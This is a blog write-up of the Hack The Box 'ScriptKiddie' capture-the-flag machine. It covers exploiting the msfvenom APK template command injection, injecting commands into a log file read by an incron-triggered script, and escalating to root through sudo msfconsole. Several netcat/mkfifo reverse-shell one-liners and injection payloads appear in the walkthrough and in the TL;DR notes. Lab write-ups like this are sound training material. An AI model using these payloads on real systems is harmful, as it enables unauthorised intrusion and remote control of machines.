---
title: "HTB: ScriptKiddie"
date: 2021-06-05
classes: wide
excerpt_separator: <!--more-->
categories:
  - writeups
tags:
  - htb.easy
  - ctf
  - metasploit
---

## >> ON THE LAST EPISODE OF HACKERTV...

Hello everybody, welcome back to the ramblings of a madman as he takes on the wild world of HacktheBox active boxes! On today's episode we tackle the [ScriptKiddie box on HTB](https://app.hackthebox.eu/machines/314) and _finally_ answer the question of who watches the watchers - or in this case, who hacks the hackers? Stay tuned for a thrilling ride involving ~~romance, espionage, and a daring standoff~~ some pretty nifty attacks on attackers' tools!
<!--more-->
>Creator: [0xdf](https://app.hackthebox.eu/users/4935)  
Rating: 4.1

## >> WE ARE VENOM

As with every HTB start, we add the IP address to `/etc/hosts` so that we can easily refer to the box because I'm supremely lazy. If you need help with this, [here's a pretty good explanation for you](https://library.netapp.com/ecmdocs/ECMP1155586/html/GUID-E306A314-D30E-4ACB-827E-1925A1368DD0.html). Make sure to drill down into the sub-article on [how to add a host name in the /etc/hosts file](https://library.netapp.com/ecmdocs/ECMP1155586/html/GUID-DBF81E5C-CF3C-4B07-AF01-83A625F2B4BF.html) as well to get the whole thing.

Neat, so now we have a quick way to refer to the box - let's kick off an `nmap` scan. Running `nmap -sCV -O -oA tcp-full -p- -v scriptkiddie.htb` nets the following (somewhat trimmed) results:

```
# Nmap 7.91 scan initiated Wed Jun  2 09:43:31 2021 as: nmap -sCV -O -oA tcp-full -p- -v scriptkiddie.htb           
Nmap scan report for scriptkiddie.htb (10.129.162.153)                                                              
Host is up (0.041s latency).                                                                                        
Not shown: 65533 closed ports                                                                                       
PORT     STATE SERVICE VERSION                                                                                      
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)                                 
| ssh-hostkey:                                                                                                      
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)                                                      
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)                                                     
|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)                                                   
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)                                                         
| http-methods:                                                                                                     
|_  Supported Methods: HEAD POST GET OPTIONS
|_http-server-header: Werkzeug/0.16.1 Python/3.8.5
|_http-title: k1d'5 h4ck3r t00l5

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jun  2 09:44:11 2021 -- 1 IP address (1 host up) scanned in 40.54 seconds
```

The first thing that caught my attention was the service open on port 5000. If you've done a few of these boxes, you'll know that that's not a standard port by any means. It presents itself as `Werkzeug 0.16.1` which is a Python-based web server; let's connect to the webpage and see what shows up.

![ScriptKiddie's index page.](/assets/images/scriptkiddie/index_page.png)

It appears that we've landed on a new hacker's site designed to run a few commands that we'd use as attackers normally - it has fields for running an `nmap` scan, generating a `msfvenom` payload, and searching for exploits via `searchsploit`. I've heard people saying that this isn't a realistic setup - just think of it as running across a VPS with someone's personal automation project. Just remember, don't hack things in the real world that you don't have permission for (`l e g a l d i s c l a i m e r s`) 😉

The first thing that I do in a situation like this is explore what the site does and try to envision _how_ it does it on the backend. Playing with inputs didn't really lead me anywhere; OS command injections were only met with a message telling me to stop hacking them, they'll hack me back. The horror! However, I noticed something rather odd when poking around the `msfvenom` options - normally you'd only be focused on Windows and Linux, but in this case it has a dropdown for Android. I also started looking into `msfvenom` template files at this point - pulling on this thread lead me to [this Rapid7 threat advisory](https://www.rapid7.com/db/modules/exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection/):

![A Rapid7 threat advisory for msfvenom APK Template Command Injection.](/assets/images/scriptkiddie/rapid7_msfvenom_exploit.png)

Interesting - so this means that `msfconsole` already has a module to exploit itself, ironically. We'll go ahead and use that in a second, but first I want to sidebar and go analyze _what_ this exploit is, and how it gets used. 

## >> JUSTIN ANALYZING JUSTIN

Let's sidebar and check out [this advisory from Justin Steven](https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md), an Australian security researcher. I highly recommend you go read the whole thing - it's a great analysis of the vulnerability itself - but I'm going to do a quick TL;DR here for you since you're already here.

From Justin's GitHub advisory: "Metasploit Framework provides the msfvenom tool for payload generation. For many of the payload types provided by msfvenom, it allows the user to provide a "template" using the -x option." What exactly does this mean? Say you have a pre-generated binary on your preferred platform and would like to use it instead of the default templates from `msfvenom`. By passing it in with the `-X` option, we can instruct `msfvenom` to use _our_ binary as the template instead - this is useful for plenty of reasons I won't get into here. However, old versions of `msfvenom` parsing an Android APK would allow characters that would escape the underlying OS commands and allow for arbitrary command execution. Specifically the following conditions must be met (again, from Justin's advisory):

>If a crafted APK file has a signature with an "Owner" field containing:  
A single quote (to escape the single-quoted string)  
Followed by shell metacharacters  
When that APK file is used as an msfvenom template, arbitrary commands can be executed on the msfvenom user's system.

So essentially if we add in a single quote, it will break the underlying command similar to a SQL injection. Thankfully, Justin's advisory has a PoC that we can use to help speed up our vulnerability analysis (also useful for the OSCP seekers out there). We also need shell metacharacters following said single quote. There's a small bit to go through, but we'll analyze the code section that breaks us out into the OS first:

```python
# Change me
payload = 'echo "Code execution as $(id)" > /tmp/win'

# b32encode to avoid badchars (keytool is picky)
# thanks to @fdellwing for noticing that base64 can sometimes break keytool
# <https://github.com/justinsteven/advisories/issues/2>
payload_b32 = b32encode(payload.encode()).decode()
dname = f"CN='|echo {payload_b32} | base32 -d | sh #"
```

Looking in there we can see the single quote and shell metacharacter (pipe in this case) followed by our OS commands being passed into base32 encoding. Now that we know _how_ it works we can just jump back to `msfconsole` and get our initial shell. Begin by finding the module (it should be `unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection`) and set the options to your current setup. In my environment it looks like this:

![Setting options for our Metasploit console payload.](/assets/images/scriptkiddie/msfconsole_generate_payload.png)

Note that we're not getting a listener automatically set up for us - we'll do that in a second. First, make sure to find/copy your new `msf.apk` wherever you want it. Then launch a listener with this: `msfconsole -x "use multi/handler; set payload cmd/unix/reverse_netcat; set lhost tun0; set lport 9001; run"`. For a quick primer, the `-x` option allows us to run the commands automatically as it opens the program (this can [also be performed with Metasploit resource scripts](https://docs.rapid7.com/metasploit/resource-scripts/)). Once that's run, you'll see that the listener is open and ready - awesome. Finally, upload our `msf.apk` template up to the site's `msfvenom` Android template option and set the other options - I used `127.0.0.1` as the listener address _on the ScriptKiddie site_ (important to differentiate, since our payload _ALSO_ has a listener address) and submitted the form. If everything goes according to plan, you should see this on your listener:

![Reverse shell connection coming from the ScriptKiddie site.](/assets/images/scriptkiddie/revshell_connection.png)

Neat, we've established a foothold as `kid`.

![Kids doing...something. It looks like dancing, I'm not really sure.](/assets/images/scriptkiddie/kid.gif)

And again - _go read Justin's advisory on GitHub._ I'd be remiss if I didn't mention it one last time, it's _that_ good.

## >> GET IN LOSER, WE'RE DOING HACKING STUFF

The very first thing I always perform when getting on a CTF box is a TTY upgrade - I want to have a nice terminal that functions as I would expect with tab auto-complete and other nice features 😉 If you need help with this on ZSH, definitely check out the TL;DR section at the bottom where I provide my step-by-step notes during the actual box. After that though, I generally follow with running [a LinPEAS scan](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) (in memory, when possible) and also poke around the filesystem. Looking in `/home/` highlights that we're not the only user; `pwn` also exists and has several interesting files in their home directory. Specifically, there's a fun file we find named `scanlosers.sh`:

```bash
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
```

The part that immediately caught my eye was that we control the `log` file, and in keeping with the theme of command injections I immediately started digging to see if we could break out of the script to execute our own code. An easy way to demo this is to slowly re-create the scenario piece-by-piece until we have a working exploit. To start, add a new file named `temp.txt` and add in some random content. Here's the first iteration of mine:

```
hello 1 2 3 4 5 6 1 friend
```

Next, I checked what the lines in the script did in pieces. `cat` is fairly straightforward, so my first command was `cat $log | cut -d' ' -f3-` - that revealed that it would keep anything after the third field. Piping this into `sort -u` just sorts it and keeps the unique lines; where we get into the real action is the `while` loop. It's also here where I diverge from the commands ever-so-slightly to simplify my PoC:

```bash
cat temp.txt | cut -d' ' -f3- | while read ip; do sh -c "echo ${ip}"; done
```

Notice that I've only changed to an echo, but realistically any command would do here - the key is that we've got a shell command that takes in our "word" from the piped input. Running the command produces the output we expected to see: `2 3 4 5 6 1 friend`. However, what if we decided to change up one of the inputs to something like `$(echo testy)`? Let's change the original input file:

```
hello 1 2 3 4 5 6 1 $(echo testy)
```
Once we re-run it, something interesting happens; on execution the script breaks out and evaluates `$(echo testy)`, causing the final output to be `hello 1 2 3 4 5 6 1 testy`. Nifty - we have our code execution vector. Referring back to the original script, all we should need to do is edit the `/home/kid/logs/hackers` file, pop in some junk entries, and append a reverse shell payload inside of `$()`. Set up a listener and add `1 2 3 4 $(rm /tmp/g;mkfifo /tmp/g;cat /tmp/g|/bin/sh -i 2>&1|nc [YOUR IP HERE] [YOUR PORT HERE] >/tmp/g)` to the file and you should receive a shell _nearly instantly_. Wait, but how?

Let's re-visit our LinPEAS input - if you took the time to review carefully, you likely noticed these wierd lines jumping out:

![LinPEAS output that mentions incrontab.](/assets/images/scriptkiddie/linpeas_find_incrontab.png)

After finding and reading some [articles on Hackaday about incrontab](https://hackaday.com/tag/incron/), I came to the conclusion that `incrontab` works essentially the same as `crontab` but with one major caveat - it watches the filesystem rather than a clock. This means that _as soon as_ it senses changes on files or directories, it runs whatever command/script you've asked it to. This makes sense - if their intention was to hack back as hinted at with the website, they'd have the site put an IP address into that file once it detected command injection and kick off an nmap near-instantaneously (this is disabled in the box for obvious reasons).

For a lot of people, this is probably the weirdest logical step - it's not something I've personally dealt with previously but would _love_ to see more boxes built around that change, especially those that deal with modifying a file for access/privilege escalation. It would be a neat way to keep things clean since you could immediately execute and then overwrite the file to ensure most everyone sees a clean file, as it was meant to be seen.

![Mr. Clean dancing while he cleans.](/assets/images/scriptkiddie/clean.gif)

## >> ASK NICELY AND WE'LL SEE

So after all that, we're now the `pwn` user - drat. We need to get escalated to root. If you've seen previous Linux posts from me, you'll know the very first thing I do once I get a _new_ account is to run `sudo -l` - if we get a hit back, there's a chance it's a free privesc. In this case, we absolutely do:

![pwn user's sudo permissions showing NOPASSWD access to msfconsole.](/assets/images/scriptkiddie/pwn_user_sudo_l.png)

Woah, that's a thing - msfconsole! We can fire it up with `sudo -u root /opt/metasploit-framework-6.0.9/msfconsole` to get access and drop into our familiar console interface. It was pretty surreal to be compromising a Metasploit instance, not gonna lie. From here, it's relatively straightforward - `msfconsole` has access to the underlying operating system in order to execute commands such as `ls`. Test it by typing `ls` with _none_ of the standard Metasploit commands - just `ls` like you would do in a regular terminal. You should see the output of whatever directory you were in like so:

![Using msfconsole to execute the ls command.](/assets/images/scriptkiddie/msf_exec_cmd_example.png)

It's also worth running a `whoami` to make sure that you've executed the `sudo` properly and are actually root and not pwn. From here, I hope you know the drill - set up _another_ listener, pop in [a reverse shell from Pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet), and viola - you are root!

## >> I AM ~~GROOT~~ ROOT

There we go - after a quick stint we've managed to compromise a webserver that was running Metasploit, with Metasploit, then used Metasploit to break out of Metasploit (yo dawg, I heard you like Metasploit...) I hope you've enjoyed this post, I learned quite a few neat tricks from it - as always, ~~make sure to like and subscribe~~ keep on keeping on and happy hacking!

\-sp1icer
  
    
      
## >> TL;DR FOR MY LAZY FRIENDS

These were my short-form notes while doing the box.

```
1. nmap to find port 5k
2. explore the webpage, see the android apk msfvenom template thing
3. use `unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection` in metasploit
	1. https://www.rapid7.com/db/modules/exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection/
4. `msfconsole -x "use multi/handler; set payload cmd/unix/reverse_netcat; set lhost tun0; set lport 9001; run"`
5. upload the `msf.apk` with the android option
6. shell as `kid`
7. Migrate to a better shell
	1. `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.117 9001 >/tmp/f`
8. TTY upgrade
	1. `python3 -c 'import pty;pty.spawn("/bin/bash")'`
	2. `stty -a | head -n1 | cut -d ';' -f 2-3 | cut -b2- | sed 's/; /\n/'`
	3. `stty raw -echo; fg`
	4. `stty rows ROWS cols COLS`
	5. `export TERM=xterm-256color`
	6. `exec /bin/bash`
9. Explore to find `/home/pwn/scanlosers.sh`
10. do local demo
11. edit `/home/kid/logs/hackers`
	1. `1 2 3 4 $(rm /tmp/g;mkfifo /tmp/g;cat /tmp/g|/bin/sh -i 2>&1|nc 10.10.14.117 9001 >/tmp/g)`
12. TTY upgrade
13. `sudo -l` to see what pwn has access to
14. `sudo -u root /opt/metasploit-framework-6.0.9/msfconsole`
15. `rm /tmp/h;mkfifo /tmp/h;cat /tmp/h|/bin/sh -i 2>&1|nc 10.10.14.117 9001 >/tmp/h`
16. root shell
```

## >> REFERENCES

In the actual post:  
[https://library.netapp.com/ecmdocs/ECMP1155586/html/GUID-E306A314-D30E-4ACB-827E-1925A1368DD0.html](https://library.netapp.com/ecmdocs/ECMP1155586/html/GUID-E306A314-D30E-4ACB-827E-1925A1368DD0.html)  
[https://library.netapp.com/ecmdocs/ECMP1155586/html/GUID-DBF81E5C-CF3C-4B07-AF01-83A625F2B4BF.html](https://library.netapp.com/ecmdocs/ECMP1155586/html/GUID-DBF81E5C-CF3C-4B07-AF01-83A625F2B4BF.html)  
[https://www.rapid7.com/db/modules/exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection/](https://www.rapid7.com/db/modules/exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection/)  
[https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md](https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md)  
[https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom#how-to-supply-a-custom-template](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom#how-to-supply-a-custom-template)  
[https://docs.rapid7.com/metasploit/resource-scripts/](https://docs.rapid7.com/metasploit/resource-scripts/)  
[https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)  
[http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)  

Extra reading:  
[https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom#how-to-supply-a-custom-template](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom#how-to-supply-a-custom-template)  